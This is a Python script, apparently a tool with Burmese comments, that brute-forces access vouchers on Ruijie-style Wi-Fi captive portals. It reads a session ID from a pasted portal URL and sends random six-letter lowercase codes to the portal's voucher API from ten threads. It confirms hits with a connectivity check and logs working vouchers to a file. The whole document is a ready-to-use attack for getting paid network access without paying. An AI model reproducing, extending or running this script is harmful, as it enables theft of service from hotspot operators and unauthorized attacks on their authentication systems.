import requests
import threading
import random
import os
import time
import string
from colorama import Fore, Style, init

init(autoreset=True)
C_CYAN = Fore.CYAN + Style.BRIGHT
C_GREEN = Fore.GREEN + Style.BRIGHT
C_RED = Fore.RED + Style.BRIGHT
C_YELLOW = Fore.YELLOW + Style.BRIGHT
C_RESET = Style.RESET_ALL

# --- [ CONFIGURATION ] ---
CHECK_URL = "http://connectivitycheck.gstatic.com/generate_204"
THREADS = 10 
stop_event = threading.Event()

def banner():
    os.system('clear')
    print(f"""{C_CYAN}
    ██╗     ██╗  ██╗██╗  ██╗ █████╗ ███╗   ██╗████████╗
    ██║     ██║ ██╔╝██║  ██║██╔══██╗████╗  ██║╚══██╔══╝
    ██║     █████╔╝ ███████║███████║██╔██╗ ██║   ██║   
    ██║     ██╔═██╗ ██╔══██║██╔══██║██║╚██╗██║   ██║   
    ███████╗██║  ██╗██║  ██║██║  ██║██║ ╚████║   ██║   
    ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   
    {C_YELLOW}>>> RUIJIE LOWERCASE-ONLY SCANNER v6.0 <<<{C_RESET}
    """)

def check_internet():
    try:
        response = requests.get(CHECK_URL, timeout=5, allow_redirects=False)
        if response.status_code == 204:
            return True
    except:
        pass
    return False

def scan_logic(sid, api_url):
    # စာလုံးအသေး (a-z) သီးသန့် သတ်မှတ်ခြင်း
    chars = string.ascii_lowercase 
    
    while not stop_event.is_set():
        # စာလုံးအသေး ၆ လုံး Random ထုတ်ခြင်း
        code = "".join(random.choice(chars) for _ in range(6))
        payload = {"accessCode": code, "sessionId": sid, "apiVersion": 1}
        
        try:
            res = requests.post(api_url, json=payload, timeout=5)
            
            if "success" in res.text.lower() or res.status_code == 200:
                print(f"\n{C_YELLOW}[!] Potential Code Found: {code}. Validating...")
                
                time.sleep(1)
                if check_internet():
                    print(f"{C_GREEN}[+++] WORKING VOUCHER: {code} (Active!){C_RESET}")
                    with open("working_vouchers.txt", "a") as f:
                        f.write(f"CODE: {code} | DATE: {time.ctime()}\n")
                else:
                    print(f"{C_RED}[-] Code {code} is valid but Internet NOT active.")
            else:
                # Testing ပြတဲ့နေရာမှာလည်း code ကို မြင်ရအောင် ထည့်ထားပါတယ်
                print(f"{C_CYAN}[*] Testing: {C_YELLOW}{code} {C_RED}[Invalid]{C_RESET}", end="\r")
            
            time.sleep(0.2) 

        except:
            time.sleep(1)

def main():
    banner()
    print(f"{C_CYAN}[?] Paste Portal URL (Browser ထဲက Link ကို ကူးထည့်ပါ):{C_RESET}")
    portal_url = input(f"{C_GREEN}root@scanner:~# {C_RESET}").strip()
    
    import re
    from urllib.parse import urlparse
    
    sid_match = re.search(r'sessionId=([a-zA-Z0-9_\-]+)', portal_url)
    if sid_match:
        sid = sid_match.group(1)
        parsed = urlparse(portal_url)
        api_url = f"{parsed.scheme}://{parsed.netloc}/api/auth/voucher/"
        
        banner()
        print(f"{C_GREEN}[✓] SID Extracted : {sid}")
        print(f"{C_GREEN}[✓] Target API    : {api_url}")
        print(f"{C_YELLOW}[!] Logic         : a-z (Lowercase Only)")
        print(f"{C_CYAN}[*] Starting Scan... Press Ctrl+C to stop.\n")
        
        for i in range(THREADS):
            t = threading.Thread(target=scan_logic, args=(sid, api_url), daemon=True)
            t.start()
            
        try:
            while True: time.sleep(1)
        except KeyboardInterrupt:
            stop_event.set()
            print(f"\n{C_RED}[!] Stopped.")
    else:
        print(f"{C_RED}[X] Invalid URL. Session ID not found.")

if __name__ == "__main__":
    main()
